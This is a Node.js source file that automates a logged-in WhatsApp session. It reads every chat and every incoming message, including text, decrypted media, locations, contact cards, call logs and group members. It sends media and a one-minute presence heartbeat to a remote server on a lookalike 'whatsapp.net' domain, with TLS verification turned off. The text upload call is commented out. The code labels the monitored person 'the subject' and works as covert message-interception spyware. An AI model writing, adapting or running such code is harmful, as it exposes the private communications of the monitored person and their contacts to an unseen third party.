const { decryptMedia } = require("@open-wa/wa-automate");
const request = require("request-promise");
const mime = require("mime-types");
const fs = require("fs");

// Возвращает дату в формате YYYY-MM-DD hh:mm:ss
if (!Date.prototype.toLString) {
  (function () {
    function pad(number) {
      if (number < 10) {
        return "0" + number;
      }
      return number;
    }

    Date.prototype.toLString = function () {
      return (
        this.getFullYear() +
        "-" +
        pad(this.getMonth() + 1) +
        "-" +
        pad(this.getDate()) +
        " " +
        pad(this.getHours()) +
        ":" +
        pad(this.getMinutes()) +
        ":" +
        pad(this.getSeconds())
      );
    };
  })();
}

//Обработка клиента :)
class Parser {
  constructor(io) {
    this.io = io;
    this.messenger = "0";
  }

  async start(client, name) {
    this.name = name;
    this.client = client;
    this.hostDevice = await this.client.getMe();
    this.hostNumber = this.hostDevice.me.user;
    this.sendActives(this.hostNumber, "0");

    console.log(`${this.hostNumber} - started parser\n`);

    //Подписка на новые сообщения
    this.client.onAnyMessage(async (message) => {
      await this.parseMsg(message);
    });

    let chats = await this.client.getAllChats();
    for (const Chat of chats) {
      let messages = await this.client.loadAndGetAllMessagesInChat(
        Chat.id,
        true,
        true
      );

      // console.log(messages.length);

      const logText = `_________ Имя чата: ${Chat.name}. Количество сообщений: ${messages.length} _________`;

      Parser.whriteLog(this.name, this.hostDevice, logText);
      this.io.emit("messanges", "MSG_NUMS", messages.length);
      let count = 0;
      for (const Message of messages) {
        await this.parseMsg(Message);
        this.io.emit("messanges", "MSG_COUNT", ++count, this.name);
      }
    }

    //Оповещение, если пользователь открыл еще одну сессию в web
    // this.client.onStateChanged((state) => {
    //   let datetime = new Date();
    //   console.log(
    //     `_____________________________________________\n${datetime.toLocaleString()}\n!!!!!STATE CHANGED!!!!!`,
    //     state
    //   );
    //   /*if (state === "CONFLICT") client.forceRefocus();*/
    // });
  }

  async parseMsg(message) {
    let msg = {};
    let Media;
    let fileName;
    if (message.type === "chat") {
      msg.type = "Сообщение";
      msg.id = this.genId(message.id);
      msg.datetime = new Date(message.timestamp * 1000).toLString();
      message.fromMe
        ? (msg.sender = "ИСХ")
        : (msg.sender = "ВХ от " + this.getAuthor(message));
      msg.text = message.body;
      msg.chatmembers = await this.parseChatMembers(message);
    } else if (message.mimetype) {
      fileName = `w_${message.t}.${mime.extension(message.mimetype)}`;
      Media = await this.getMedia(message, fileName);
      Media ? (msg.filename = fileName) : (msg.filename = "");
      msg.type = "Медиафайл";
      msg.id = this.genId(message.id);
      msg.datetime = new Date(message.timestamp * 1000).toLString();
      message.fromMe
        ? (msg.sender = "ИСХ")
        : (msg.sender = "ВХ от " + this.getAuthor(message));
      message.caption
        ? (msg.text = "[Медиафайл] " + message.caption)
        : (msg.text = "[Медиафайл]");
      msg.chatmembers = await this.parseChatMembers(message);
    } else if (message.type === "location") {
      msg.type = "Местоположение";
      msg.id = this.genId(message.id);
      msg.datetime = new Date(message.timestamp * 1000).toLString();
      message.fromMe
        ? (msg.sender = "ИСХ")
        : (msg.sender = "ВХ от " + this.getAuthor(message));
      msg.text = `[${message.lat}, ${message.lng}]\n${
        message.loc ? message.loc : ""
      }`;
      msg.chatmembers = await this.parseChatMembers(message);
    } else if (message.type === "vcard") {
      msg.type = "Контакт";
      msg.id = this.genId(message.id);
      msg.datetime = new Date(message.timestamp * 1000).toLString();
      message.fromMe
        ? (msg.sender = "ИСХ")
        : (msg.sender = "ВХ от " + this.getAuthor(message));
      msg.text = `${
        message.vcardFormattedName ? message.vcardFormattedName : ""
      }\n${message.body ? message.body : ""}`;
      msg.chatmembers = await this.parseChatMembers(message);
    } else if (message.type === "call_log") {
      msg.type = "Звонок";
      msg.id = this.genId(message.id);
      msg.datetime = new Date(message.timestamp * 1000).toLString();
      message.fromMe
        ? (msg.sender = "ИСХ")
        : (msg.sender = "ВХ от " + this.getAuthor(message));
      msg.text = `[ПРОПУЩЕНЫЙ ЗВОНОК]`;
      msg.chatmembers = await this.parseChatMembers(message);
    }
    if (typeof msg.type != "undefined") {
      await this.sleep(10);
      await this.sendMsg(msg, this.name, this.hostDevice);
      if (msg.filename) {
        await this.sleep(10);
        await this.sendMedia(Media, fileName, this.name, this.hostDevice);
      }
    }
  }

  // Отправка сообщения на сервер возвращет 0 если отправка успешна
  async sendMsg(msg, name, hostDevice) {
    let options = {
      method: "POST",
      uri: "https://loger.whatsapp.net/mtext_wr.php",
      form: {
        number: this.hostNumber,
        messenger: this.messenger,
        datetime: msg.datetime,
        sender: msg.sender,
        chatmembers: msg.chatmembers,
        text: msg.text,
        mid: msg.id,
        filename: msg.filename ? msg.filename : "",
        type: msg.type,
      },
      rejectUnauthorized: false,
      headers: {
        Connection: "keep-alive",
        "Accept-Encoding": "",
        "Accept-Language": "en-US,en;q=0.8",
        /* 'content-type': 'application/x-www-form-urlencoded' */ // Is set automatically
      },
    };

    // request(options)
    //   .then(function (body) {
    //     Parser.whriteLog(name, hostDevice, msg.text, body);
    //   })
    //   .catch(function (err) {
    //     const text = `Upload failed: ${err}`;
    //     Parser.whriteLog(name, hostDevice, text);
    //   });
  }

  // Отправка медиа на сервер
  async sendMedia(Media, filename, name, hostDevice) {
    let req = request.post(
      "https://loger.whatsapp.net/mfile_wr.php",
      { rejectUnauthorized: false },
      function (err, resp, body) {
        if (err) {
          Parser.whriteLog(
            name,
            hostDevice,
            `${filename} - ERROR write on server!`,
            body
          );
        } else {
          Parser.whriteLog(
            name,
            hostDevice,
            `The file " + ${filename} + " was saved!`,
            body
          );
        }
      }
    );
    let form = req.form();
    form.append("file", Media, {
      filename: filename,
      contentType: "text/plain",
    });
  }

  //Отправка активности
  sendActives() {
    function sendActive() {
      let datetime = new Date();
      let req = request.post(
        "https://loger.whatsapp.net/active.php",
        { rejectUnauthorized: false },
        function (err, resp, body) {
          if (err) {
            console.log("Error!");
          } /*else {
                    console.log(`_____________________________________________\n${datetime.toLocaleString()}\nTickTock, mthfckr`);
                }*/
        }
      );
      let form = req.form();
      form.append("number", this.hostNumber || "");
      form.append("messenger", this.messenger || "");
    }

    setInterval(sendActive.bind(this), 60000);
  }

  // Определение автора входящего сообщения в группе
  getAuthor(msg) {
    let author;
    msg.isGroupMsg && !msg.fromMe
      ? (author = msg.author.substring(0, msg.author.indexOf("@")))
      : (author = "");
    return author;
  }

  // Генерация Id сообщения
  genId(str, asString, seed) {
    var i,
      l,
      hval = seed === undefined ? 0x811c9dc5 : seed;

    for (i = 0, l = str.length; i < l; i++) {
      hval ^= str.charCodeAt(i);
      hval +=
        (hval << 1) + (hval << 4) + (hval << 7) + (hval << 8) + (hval << 24);
    }
    if (asString) {
      return ("0000000" + (hval >>> 0).toString(16)).substr(-8);
    }
    return hval >>> 0;
  }

  // Возвращает участников группы или чата
  async parseChatMembers(message) {
    let contacts,
      arr = [];
    let chatmembers, numbr, name, pushname, formattedName;
    let iter = 0;

    if (message.isGroupMsg) {
      contacts = await this.client.getGroupMembers(message.chat.id);
      for (let i = 0; i < contacts.length; i++) {
        numbr = contacts[i].id.substring(0, contacts[i].id.indexOf("@"));
        name = contacts[i].name ? contacts[i].name + "/" : "";
        pushname = contacts[i].pushname ? contacts[i].pushname : "";
        formattedName = contacts[i].formattedName === "Вы" ? "Объект" : "";
        let chatmember = numbr + "-" + name + pushname + formattedName;
        arr[iter] = chatmember;
        iter++;
      }
      chatmembers =
        "[Группа] " +
        '"' +
        message.chat.name +
        '"' +
        " (" +
        arr.join("; ") +
        ")";
      return chatmembers;
    } else
      numbr = message.chat.contact.id.substring(
        0,
        message.chat.contact.id.indexOf("@")
      );
    name = message.chat.contact.name ? message.chat.contact.name + " " : "";
    pushname = message.chat.contact.pushname
      ? message.chat.contact.pushname
      : "";
    chatmembers = numbr + "-" + name + pushname;
    return chatmembers;
  }

  // Задержка
  async sleep(ms) {
    return new Promise((res) => setTimeout(res, ms));
  }

  // Получение медиафайлов
  async getMedia(message, filename) {
    try {
      const mediaData = await decryptMedia(message); //forceStaleMediaUpdate(message.id);//
      /*const imageBase64 = `data:${message.mimetype};base64,${mediaData.toString(
                'base64'
            )}`;*/

      /*fs.writeFile(filename, mediaData, function (err) {
                if (err) {
                    return console.log(err);
                }
                console.log('The file ' + filename + ' was saved!');
            });*/
      return mediaData;
    } catch (e) {
      Parser.whriteLog(
        this.name,
        this.hostDevice,
        `Ошибка ${e.name} : ${e.message}`
      );
    }
  }

  static whriteLog(name, hostDevice, msg, body = "") {
    let datetime = new Date();
    fs.appendFileSync(
      `logs/${name}/${hostDevice.me.user}.log`,
      `${datetime.toLocaleString()} [${msg}] ${body}\n`
    );
  }
}

module.exports = Parser;
